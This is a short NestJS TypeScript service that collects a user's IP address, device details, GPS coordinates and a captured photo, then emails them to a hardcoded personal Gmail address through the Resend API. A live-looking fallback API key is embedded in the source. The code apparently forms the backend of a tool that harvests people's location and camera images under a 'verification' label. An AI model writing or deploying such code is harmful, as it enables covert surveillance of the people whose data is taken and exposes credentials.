import { Injectable } from '@nestjs/common';
import { Resend } from 'resend';

@Injectable()
export class CollectService {
  private resend = new Resend(process.env.RESEND_API_KEY || 're_gpkA1ugT_KYx93iVC8F6GTFwKFdUmRjGh');

  async sendEmail(data: any) {
    const mapLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;

    await this.resend.emails.send({
      from: 'onboarding@resend.dev',
      to: ['manishkumr101k@gmail.com'],
      subject: '📸 User Verification Data',

      html: `
        <h2>User Verification</h2>

        <p><b>IP Address:</b> ${data.ip}</p>

        <p><b>Device Info:</b><br/>${data.deviceInfo}</p>

        <p><b>GPS Location:</b><br/>
        Latitude: ${data.latitude}<br/>
        Longitude: ${data.longitude}</p>

        <p><b>Google Maps:</b>
        <a href="${mapLink}" target="_blank">Open Location</a></p>

        <p><b>Captured Photo:</b></p>
        <img src="cid:user-photo" width="300"/>

        <p><b>Time:</b> ${new Date().toLocaleString()}</p>
      `,

      attachments: [
        {
          filename: 'photo.jpg',
          content: data.photo.buffer.toString('base64'),
          contentId:'user-photo',
        },
      ],
    });
  }
}
